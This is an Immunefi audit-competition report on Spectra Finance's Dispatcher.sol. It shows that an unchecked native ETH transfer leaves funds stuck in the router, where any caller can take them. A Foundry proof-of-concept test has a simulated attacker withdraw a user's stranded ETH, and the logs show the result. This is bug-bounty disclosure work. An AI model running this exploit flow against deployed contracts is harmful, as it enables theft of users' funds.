# #44035 \[SC-Low] Lack of validation in native transfer allows attacker to steal user funds

**Submitted on Apr 16th 2025 at 08:37:05 UTC by @TECHFUND\_inc for** [**Audit Comp | Spectra Finance**](https://immunefi.com/audit-competition/audit-comp-spectra-finance)

* **Report ID:** #44035
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/Spectra-Audit-Competition/blob/main/src/router/Dispatcher.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

There is **no `require(success)` or conditional check** in Dispatcher.sol contract. This means failed transfers will go unnoticed.

When a native transfer fails (e.g., receiver contract has no `receive()` or `fallback()` function), the dispatcher **does not check the result of the low-level call**. This causes the ETH to remain stuck inside the protocol.

Because the protocol does not associate the ETH with the original sender or restrict who can call `TRANSFER_NATIVE`, **any attacker can later call `execute()` and withdraw the stuck funds to their own address**. This results in **permanent loss of funds** for the original user.

## Vulnerability Details

Here is the code snippet taken from Dispatcher.sol contract where we have an issue

```solidity
else if (command == Commands.TRANSFER_NATIVE) {
(address recipient, uint256 amount) = abi.decode(_inputs, (address, uint256));
(bool success, ) = payable(recipient).call{value: amount}("");
//@audit - no validation here on return value !
}
```

Attack flow

1. User sends ETH via dispatcher to a receiver contract but the receiver contract reverts due to some reasons.
2. Transfer fails and dispatcher transaction is successful, but dispatcher contract doesnt return funds.
3. ETH remains in the Spectra protocol.
4. Attacker later calls `execute()` with `TRANSFER_NATIVE`, using their own address.
5. Spectra Protocol sends the stuck ETH to the attacker through dispatch

## Impact Details

Loss of funds for the user. Attacker can steal them

## References

<https://github.com/immunefi-team/Spectra-Audit-Competition/blob/1cebdc67a9276fd87105d13f302fd77d000d0c0b/src/router/Dispatcher.sol#L483>

## Proof of Concept

## Proof of Concept

Filename: RouterTest1.t.sol

Function: testEtherTransfer()

Run this command forge test --match-contract RouterTest1 --mt testEtherTransfer -vvv

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.20;
import "forge-std/Test.sol";
import "src/libraries/RayMath.sol";
import {RouterBaseTest} from "./RouterBaseTest.t.sol";
import {Commands} from "src/router/Commands.sol";
import {Constants} from "src/router/Constants.sol";
import {IERC20} from "openzeppelin-contracts/interfaces/IERC20.sol";
import {console} from "forge-std/console.sol";

contract ReceiverTestContract {
    constructor() {}

    //@audit - no Receive, fallback function - Contract will revert when ether is transferred here
}

contract ContractRouterTest1 is RouterBaseTest {
    using RayMath for uint256;
    event RouterUtilChange(address indexed previousRouterUtil, address indexed newRouterUtil);
    event KyberRouterChange(address indexed previousKyberRouter, address indexed newKyberRouter);
    event Paused(address account);
    event Unpaused(address account);
    address private constant WETH_WRAPPER_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    function setUp() public override {
        super.setUp();
        underlying.mint(testUser, FAUCET_AMOUNT * 3);
        ibt.deposit(FAUCET_AMOUNT * 2, testUser);
        ibt.approve(address(spectra4626Wrapper), FAUCET_AMOUNT);
        spectra4626Wrapper.wrap(FAUCET_AMOUNT, testUser);
    }

    // forge test  --match-contract RouterTest1 --mt testEtherTransfer -vvv
    function testEtherTransfer() public {
        uint256 amount = 1 ether;
        address payable sender = payable(address(this));

        //@audit - This contract reverts for some reason but this is not handled in dispatcher pp
        address receiver = address(new ReceiverTestContract());
        address attacker = makeAddr("attacker");

        // sender has 1 ether balance
        vm.deal(sender, amount);
        console.log("----------------------------------------------");
        console.log("Initial balances before the Action");
        console.log("Sender Balance: ", sender.balance);
        console.log("Receiver balance: ", receiver.balance);
        console.log("Router balance: ", address(router).balance);
        console.log("Attacker balance: ", attacker.balance);
        console.log("----------------------------------------------");

        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.TRANSFER_NATIVE)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(receiver, amount);

        //Execute
        vm.prank(sender);
        router.execute{value: amount}(commands, inputs);
        console.log(
            "Transaction is successful even when Receiver contract reverted. Now Router is still holding the ether"
        );

        assertEq(address(receiver).balance, 0, "Error: Receiver has received the balance!");
        //@audit - Router is holding the ether now
        assertEq(address(router).balance, amount, "Error: Router doesn't hold the balance!");

        //@audit - Now attacker can transfer this ether to himself

        // Build the router execution
        commands = abi.encodePacked(bytes1(uint8(Commands.TRANSFER_NATIVE)));
        //@audit - attacker gives his own address. ether will be taken from router received through dispatcher receive(), fallback()
        inputs = new bytes[](1);
        inputs[0] = abi.encode(attacker, amount);

        //Transfer the ether
        vm.prank(attacker);
        router.execute(commands, inputs);
        console.log("Transaction is successful: Attacker have stolen the user balance ");
        console.log("----------------------------------------------");

        console.log("Final balances after the Action");
        console.log("Sender Balance: ", sender.balance);
        console.log("Receiver balance: ", receiver.balance);
        console.log("Router balance: ", address(router).balance);
        console.log("Attacker balance: ", attacker.balance);
        console.log("----------------------------------------------");

        console.log("Sender lost the funds !!");
        console.log("----------------------------------------------");

        assertGe(address(attacker).balance, amount, "Attacker didn't receive the ether!");
        assertEq(address(router).balance, 0, "Error: Router has non zero balance");
        assertEq(address(sender).balance, 0, "Error: Sender has non zero balance");
        assertEq(address(receiver).balance, 0, "Error: Receiver has non zero balance");
    }
}
```

Here are the logs:

```
Initial balances before the Action
Sender Balance: 1000000000000000000
Receiver balance: 0
Router balance: 0
Attacker balance: 0

Transaction is successful even when Receiver contract reverted. Now Router is still holding the ether
Transaction is successful: Attacker have stolen the user balance

Final balances after the Action
Sender Balance: 0
Receiver balance: 0
Router balance: 0
Attacker balance: 1000000000000000000

Sender lost the funds !!
```
